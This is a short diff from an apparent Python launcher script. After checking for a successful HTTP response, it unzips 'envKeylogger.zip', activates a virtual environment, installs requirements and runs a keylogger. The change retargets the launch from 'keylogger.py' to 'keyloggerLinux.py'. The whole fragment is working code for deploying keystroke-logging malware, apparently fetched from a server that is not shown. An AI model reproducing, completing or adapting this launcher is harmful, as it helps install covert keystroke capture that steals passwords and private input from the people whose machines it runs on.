@@ -14,4 +14,4 @@ if response.status_code == 200:
 os.system('unzip envKeylogger.zip')
 os.system('source envKeylogger/bin/activate')
 os.system('pip install -r requirements.txt')
-os.system('python3 keylogger.py')
+os.system('python3 keyloggerLinux.py')
